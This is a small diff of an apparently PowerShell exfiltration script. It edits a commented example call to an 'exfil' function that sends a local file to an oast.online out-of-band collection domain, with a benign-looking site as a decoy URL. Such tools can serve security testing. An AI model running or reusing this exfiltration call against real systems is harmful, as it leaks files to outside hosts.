@@ -104,4 +104,4 @@ function exfil {
     }
 }
 
-# exfil -regex 'xregex' -domain 'clndh3qilvdv6403g1n0hs3rhd6xpfmjn.oast.online' -url 'adobe.com' -filepath .\AST-Test.txt
+# exfil -regex 'xregex' -domain 'clndh3qilvdv6403g1n0hs3rhd6xpfmjn.oast.online' -url 'example.com' -filepath .\AST-Test.txt
